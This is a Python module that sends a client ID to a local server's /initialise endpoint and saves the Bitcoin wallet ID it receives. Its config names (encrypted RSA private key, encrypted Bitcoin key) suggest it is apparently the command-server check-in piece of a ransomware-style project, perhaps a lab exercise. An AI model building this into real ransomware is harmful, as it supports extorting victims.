import logging
import requests
import core.utils as utils
from base64 import b64encode, b64decode
from core.config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
    CLIENT_ID_LOCATION
)

logger = logging.getLogger(__name__)

    

def build_request():
    logger.info("Building initalisation Request")
    
    body = {"client_id": utils.get_client_id(), "statistics": {"key": "value"}}
    return body


def send_request(server, body):
    logger.info(f"Sending request to {server}")
    response = requests.post(url=f"{server}/initialise", json=body).json()
    return response


def get_bitcoin_wallet_address():
    body = build_request()
    response = send_request(server="http://localhost:5000", body=body)
    client_id = response.get("client_id")
    wallet_id = response.get("wallet_id").encode()
    if utils.get_client_id() == client_id:
        logger.info("Wallet ID successfully received")
        utils.write_data_to_file(BITCOIN_WALLET_ID_PATH, wallet_id)
        return response.get("wallet_id")

